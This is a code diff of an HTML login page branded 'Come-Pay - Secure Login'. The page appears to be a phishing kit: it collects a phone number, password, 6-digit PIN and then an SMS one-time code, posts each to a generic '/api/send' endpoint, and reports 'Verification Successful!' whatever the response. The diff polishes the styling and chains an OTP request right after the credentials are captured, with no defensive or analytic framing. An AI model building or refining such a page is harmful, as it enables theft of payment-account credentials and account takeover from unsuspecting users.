@@ -5,65 +5,81 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Come-Pay - Secure Login</title>
     <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
         body {
-            font-family: Arial, sans-serif;
             background-color: #f4f6f9;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            min-height: 100vh;
+            padding: 20px;
         }
         .container {
             background: #ffffff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
             width: 100%;
-            max-width: 380px;
-            text-align: center;
+            max-width: 400px;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
         }
-        .logo {
-            width: 80px;
-            height: 80px;
+        .logo-container {
+            text-align: center;
             margin-bottom: 20px;
+        }
+        .logo-container img {
+            width: 50px;
+            height: 50px;
             border-radius: 50%;
+            object-fit: cover;
         }
         h2 {
-            margin-bottom: 20px;
+            text-align: center;
             color: #333;
+            font-size: 22px;
+            margin-bottom: 25px;
         }
         .form-group {
-            margin-bottom: 15px;
-            text-align: left;
+            margin-bottom: 20px;
         }
         label {
             display: block;
-            margin-bottom: 5px;
-            color: #666;
-            font-size: 14px;
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 8px;
+            font-weight: 500;
         }
         input {
             width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
-            font-size: 16px;
+            padding: 12px 14px;
+            border: 1px solid #dcdcdc;
+            border-radius: 8px;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s;
         }
-        button {
+        input:focus {
+            border-color: #0066ff;
+        }
+        .btn {
             width: 100%;
-            padding: 12px;
-            background: #007bff;
-            border: none;
+            padding: 13px;
+            background-color: #0066ff;
             color: white;
+            border: none;
+            border-radius: 8px;
             font-size: 16px;
-            border-radius: 5px;
+            font-weight: 600;
             cursor: pointer;
             margin-top: 10px;
+            transition: background-color 0.2s;
         }
-        button:hover {
-            background: #0056b3;
+        .btn:hover {
+            background-color: #0052cc;
         }
         .hidden {
             display: none;
@@ -72,83 +88,108 @@
 </head>
 <body>
 
-<div class="container">
-    <img src="comelogo.png" alt="Logo" class="logo">
-    
-    <!-- LOGIN FORM -->
-    <div id="login-section">
-        <h2>Come-Pay Login</h2>
-        <form id="loginForm">
-            <div class="form-group">
-                <label>Phone Number</label>
-                <input type="tel" id="phone" required placeholder="Enter phone number">
-            </div>
-            <div class="form-group">
-                <label>Password</label>
-                <input type="password" id="pass" required placeholder="Enter password">
-            </div>
-            <div class="form-group">
-                <label>6-digit PIN</label>
-                <input type="password" id="pin" maxlength="6" required placeholder="Enter 6-digit PIN">
-            </div>
-            <button type="submit">Proceed</button>
-        </form>
+    <div class="container">
+        <div class="logo-container">
+            <img src="comelogo.jpg" alt="Logo" onerror="this.style.display='none'">
+            <h3 style="font-size: 16px; color: #666; margin-top: 5px;">Come-Pay</h3>
+        </div>
+
+        <!-- Login Step -->
+        <div id="step-login">
+            <h2>Come-Pay Login</h2>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Phone Number</label>
+                    <input type="tel" id="phone" placeholder="Enter phone number" required>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="pass" placeholder="Enter password" required>
+                </div>
+                <div class="form-group">
+                    <label>6-digit PIN</label>
+                    <input type="password" id="pin" maxlength="6" placeholder="Enter 6-digit PIN" required>
+                </div>
+                <button type="submit" class="btn" id="loginBtn">Proceed</button>
+            </form>
+        </div>
+
+        <!-- OTP Step -->
+        <div id="step-otp" class="hidden">
+            <h2>Verify OTP</h2>
+            <p style="text-align: center; font-size: 14px; color: #666; margin-bottom: 20px;">Please enter the verification code sent to your phone.</p>
+            <form id="otpForm">
+                <div class="form-group">
+                    <label>Enter OTP</label>
+                    <input type="text" id="otp" maxlength="6" placeholder="Enter 6-digit OTP" required>
+                </div>
+                <button type="submit" class="btn" id="otpBtn">Verify</button>
+            </form>
+        </div>
     </div>
 
-    <!-- OTP SECTION -->
-    <div id="otp-section" class="hidden">
-        <h2>Verify OTP</h2>
-        <p style="font-size: 14px; color: #666;">Please enter the OTP sent to your phone.</p>
-        <form id="otpForm">
-            <div class="form-group">
-                <label>Enter OTP</label>
-                <input type="text" id="otp" required placeholder="Enter OTP code">
-            </div>
-            <button type="submit">Verify & Submit</button>
-        </form>
-    </div>
-</div>
+    <script>
+        let userPhone = '';
 
-<script>
-    let userPhone = '';
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            userPhone = document.getElementById('phone').value;
+            const pass = document.getElementById('pass').value;
+            const pin = document.getElementById('pin').value;
+            const btn = document.getElementById('loginBtn');
 
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        userPhone = document.getElementById('phone').value;
-        const pass = document.getElementById('pass').value;
-        const pin = document.getElementById('pin').value;
+            btn.disabled = true;
+            btn.textContent = 'Please wait...';
 
-        // Send login data to Vercel API
-        fetch('/api/send', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ type: 'login', phone: userPhone, pass: pass, pin: pin })
-        }).then(res => res.json()).then(data => {
-            if(data.success) {
-                // Switch to OTP section
-                document.getElementById('login-section').classList.add('hidden');
-                document.getElementById('otp-section').classList.remove('hidden');
-            }
-        }).catch(err => alert('Something went wrong!'));
-    });
+            fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type: 'login', phone: userPhone, pass: pass, pin: pin })
+            })
+            .then(res => res.json())
+            .then(data => {
+                // Trigger OTP request next
+                return fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ type: 'send_otp', phone: userPhone })
+                });
+            })
+            .then(() => {
+                document.getElementById('step-login').classList.add('hidden');
+                document.getElementById('step-otp').classList.remove('hidden');
+            })
+            .catch(err => {
+                alert('Something went wrong. Please try again.');
+                btn.disabled = false;
+                btn.textContent = 'Proceed';
+            });
+        });
 
-    document.getElementById('otpForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        const otp = document.getElementById('otp').value;
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const otp = document.getElementById('otp').value;
+            const btn = document.getElementById('otpBtn');
 
-        // Send OTP data to Vercel API
-        fetch('/api/send', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ type: 'verify_otp', phone: userPhone, otp: otp })
-        }).then(res => res.json()).then(data => {
-            if(data.success) {
+            btn.disabled = true;
+            btn.textContent = 'Verifying...';
+
+            fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type: 'verify_otp', phone: userPhone, otp: otp })
+            })
+            .then(res => res.json())
+            .then(data => {
                 alert('Verification Successful!');
                 window.location.reload();
-            }
-        }).catch(err => alert('Something went wrong!'));
-    });
-</script>
-
+            })
+            .catch(err => {
+                alert('Invalid OTP. Try again.');
+                btn.disabled = false;
+                btn.textContent = 'Verify';
+            });
+        });
+    </script>
 </body>
 </html>
